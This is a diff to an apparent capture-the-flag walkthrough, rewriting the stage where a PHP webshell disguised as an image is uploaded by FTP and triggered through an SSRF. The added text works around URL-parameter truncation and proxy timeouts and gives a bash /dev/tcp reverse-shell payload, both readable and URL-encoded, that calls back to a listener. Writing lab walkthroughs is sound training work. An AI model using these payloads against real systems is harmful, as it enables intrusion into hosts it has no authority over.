@@ -69,20 +69,57 @@ openssl enc -d -aes-256-cbc -pbkdf2 -in readme.enc -pass pass:"cr1b_dr4gst3g0"
 The note reveals the real passphrase joins the two with an **underscore**:
 `cr1b_dr4g_st3g0`.
 
-## Stage 5 — Webshell → shell
+## Stage 5 — Webshell → reverse shell
 
 `backup.jpg` is actually PHP (`file backup.jpg` → "PHP script"). Rename to
 `shell.php`, upload via FTP (`svcbackup` / `Backup$2024!`, jailed to
-`/uploads`), trigger through the SSRF:
+`/uploads`), and trigger it through the SSRF action.
+
+**Smoke test — plain command exec.** No shell metacharacters, so it can go raw:
 ```
 path=/uploads/shell.php?cmd=id
 ```
-For an interactive shell, callback via `host.docker.internal`:
+You should see `uid=33(www-data) ...` proxied back.
+
+> **Why the naive reverse-shell one-liner fails (and how to fix it).**
+> The SSRF action forwards your `path` with a raw string concat —
+> `requests.get(f"http://{host}{path}", timeout=5)`. Two consequences you must
+> work around:
+>   1. **`&` truncates the command.** A reverse shell one-liner contains `>&`
+>      and `0>&1`; the unescaped `&` is a query-param separator, so `$_GET['cmd']`
+>      arrives cut off at the first `&` (you'd get `bash -c 'bash -i >`). The
+>      entire `cmd` value must be **URL-encoded**. Note this lives in the `path`
+>      *form field*, so `curl --data-urlencode` won't encode the query for you —
+>      encode the `?cmd=` portion yourself.
+>   2. **An interactive shell blocks past the 5s proxy timeout.** `system()`
+>      won't return while the shell is live, so the action hits `timeout=5`,
+>      returns 502, and tears the child down. **Background and detach** the shell
+>      (`setsid … &`) so `system()` returns immediately and the callback survives.
+>
+> Also: `system()` runs under `/bin/sh` (dash on Ubuntu 24.04), and `/dev/tcp`
+> is a bash-ism — the `bash -c '…'` wrapper is mandatory, not cosmetic.
+
+**Interactive reverse shell.** Start a listener:
 ```bash
-# listener:  nc -lvnp 4444
-path=/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/host.docker.internal/4444 0>&1'
+nc -lvnp 4444
 ```
-Lands as low-priv `www-data`.
+The payload, in readable form, is:
+```
+bash -c 'setsid bash -i >& /dev/tcp/host.docker.internal/4444 0>&1 &'
+```
+URL-encoded for the `?cmd=` trigger (this is what you actually send):
+```
+path=/uploads/shell.php?cmd=bash%20-c%20%27setsid%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fhost.docker.internal%2F4444%200%3E%261%20%26%27
+```
+Lands as low-priv **`www-data`**.
+
+> **Callback target.** `host.docker.internal` only resolves inside the
+> ops-server container when the compose file maps it — this repo now sets
+> `extra_hosts: ["host.docker.internal:host-gateway"]` on `ops-server`, so a
+> listener on the **docker host** works. If instead you're catching the shell
+> on a remote box (a hosted CTF where players use their own machine), drop
+> `host.docker.internal`, put your reachable IP in the payload, and make sure
+> the ops-server container has outbound egress to it.
 
 ## Stage 6 — Privilege escalation
 
